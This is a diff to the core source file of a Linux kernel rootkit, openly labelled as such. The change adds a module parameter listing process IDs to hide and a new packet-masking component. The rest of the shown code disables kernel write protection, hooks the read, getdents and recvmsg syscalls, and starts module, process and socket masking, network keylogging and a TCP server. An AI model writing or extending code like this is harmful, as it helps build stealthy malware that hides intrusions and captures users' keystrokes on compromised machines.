@@ -21,18 +21,19 @@
 /*                                                                             */
 /*******************************************************************************/
 
-#include <linux/module.h>		/* Needed by all kernel modules */
-#include <linux/list.h>			/* Needed for linked list interface */
-#include <linux/syscalls.h>		/* Needed for __NR_read, __NR_getdents & __NR_recvmsg */
-#include <linux/slab.h>			/* Needed for kzalloc & kfree */
+#include <linux/module.h>			/* Needed by all kernel modules */
+#include <linux/list.h>				/* Needed for linked list interface */
+#include <linux/syscalls.h>			/* Needed for __NR_read, __NR_getdents & __NR_recvmsg */
+#include <linux/slab.h>				/* Needed for kzalloc & kfree */
 
-#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
-#include "module_masking.h"		/* Needed for ... */
-#include "network_keylogging.h"	/* Needed for ... */
-#include "process_masking.h"	/* Needed for ... */
-#include "socket_masking.h"		/* Needed for ... */
-#include "conf_manager.h"		/* Needed for ... */
-#include "tcp_server.h"			/* Needed for ... */
+#include "sysmap.h"					/* Needed for ROOTKIT_SYS_CALL_TABLE */
+#include "module_masking.h"			/* Needed for ... */
+#include "network_keylogging.h"		/* Needed for ... */
+#include "process_masking.h"		/* Needed for ... */
+#include "socket_masking.h"			/* Needed for ... */
+#include "packet_masking.h"			/* Needed for ... */
+#include "conf_manager.h"			/* Needed for ... */
+#include "tcp_server.h"				/* Needed for ... */
 
 
 MODULE_LICENSE("GPL");
@@ -51,6 +52,7 @@ MODULE_AUTHOR("Nedko<nedko.stefanov.nedkov@gmail.com>");
 
 /* Definition of macros */
 #define DEBUG_MODE_IS_ON 1
+#define PIDS_BUFFSIZE 8
 #define PRINT(str) printk(KERN_INFO "rootkit core: %s\n", (str))
 #define DEBUG_PRINT(str) if (DEBUG_MODE_IS_ON) PRINT(str)
 #define CR0_WRITE_PROTECT_MASK (1 << 16)
@@ -68,6 +70,8 @@ typedef asmlinkage ssize_t (*my_recvmsg_syscall)(int, struct user_msghdr __user 
 
 
 /* Definition of global variables */
+static int pids[PIDS_BUFFSIZE];
+static int pids_count;
 static void **syscall_table;
 asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
 asmlinkage int (*original_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);
@@ -75,8 +79,8 @@ asmlinkage ssize_t (*original_recvmsg_syscall)(int, struct user_msghdr __user *,
 
 
 /* Declaration of functions */
-static void disable_write_protect_mode(void);
-static void enable_write_protect_mode(void);
+void disable_write_protect_mode(void);
+void enable_write_protect_mode(void);
 
 asmlinkage long generic_read_syscall(unsigned int, char __user *, size_t);
 asmlinkage int generic_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);
@@ -90,6 +94,9 @@ asmlinkage ssize_t generic_recvmsg_syscall(int, struct user_msghdr __user *, uns
 /*******************************************************************************/
 
 
+module_param_array(pids, int, &pids_count, 0);
+MODULE_PARM_DESC(pids, "PIDS to be masked");
+
 /* Callback list heads */
 LIST_HEAD(read_callbacks);
 LIST_HEAD(getdents_callbacks);
@@ -100,6 +107,9 @@ LIST_HEAD(recvmsg_callbacks);
    insmoded into the kernel. It replaces ... */
 static int __init core_start(void)
 {
+	if (pids_count == 0)
+		return -EINVAL;
+
 	disable_write_protect_mode();
 
 	/* Store original syscall addresses */
@@ -118,9 +128,10 @@ static int __init core_start(void)
 	//TODO: check return values
 	module_masking_init(DEBUG_MODE_IS_ON);
 	network_keylogging_init(DEBUG_MODE_IS_ON);
-	process_masking_init(DEBUG_MODE_IS_ON);
+	process_masking_init(DEBUG_MODE_IS_ON, pids, pids_count);
 	socket_masking_init(DEBUG_MODE_IS_ON);
-	conf_manager_init(DEBUG_MODE_IS_ON);
+	packet_masking_init(DEBUG_MODE_IS_ON);
+	conf_manager_init(DEBUG_MODE_IS_ON, pids[0]);
 	tcp_server_init(DEBUG_MODE_IS_ON);
 
 	DEBUG_PRINT("successfully inserted");
@@ -145,6 +156,7 @@ static void __exit core_end(void)
 
 	tcp_server_exit();
 	conf_manager_exit();
+	packet_masking_exit();
 	socket_masking_exit();
 	process_masking_exit();
 	network_keylogging_exit();
